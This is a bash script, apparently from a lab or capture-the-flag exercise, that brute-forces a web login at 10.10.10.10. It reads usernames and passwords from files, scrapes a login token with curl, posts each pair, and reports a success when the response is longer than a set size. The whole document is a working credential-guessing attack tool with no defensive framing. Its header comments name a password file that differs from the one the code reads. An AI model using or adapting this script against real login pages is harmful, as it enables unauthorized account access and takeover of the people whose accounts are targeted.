#!/usr/bin/env bash

# Brute force log in 
# - Uses password.txt file
# - Uses usernames.txt file

url='http://10.10.10.10/login'
i=1
failed_request_size=4179
regex='[a-z0-9]{32}'

function set_token {
    login=$(curl -s -L --cookie-jar cookie.txt $1)
    if [[ $login =~ $2 ]]
    then
        echo $BASH_REMATCH
    fi
}

while IFS='' read username
do
    l=$i"p"
    password=$(sed -n "$l" ./passwords.txt)
    token=$(set_token $url $regex)
    response=$(curl -s -d "username=$username" -d "password=$password" --cookie cookie.txt -d "loginToken=$token" "$url")
    ((i=i+1))
    size=${#response}

    # Success if request is larger than failed_request_size
    if [[ $size -gt $failed_request_size ]]
    then
        echo -e "\033[0;32mSUCCESS:\033[0m $username:$password"
    fi
done < usernames.txt
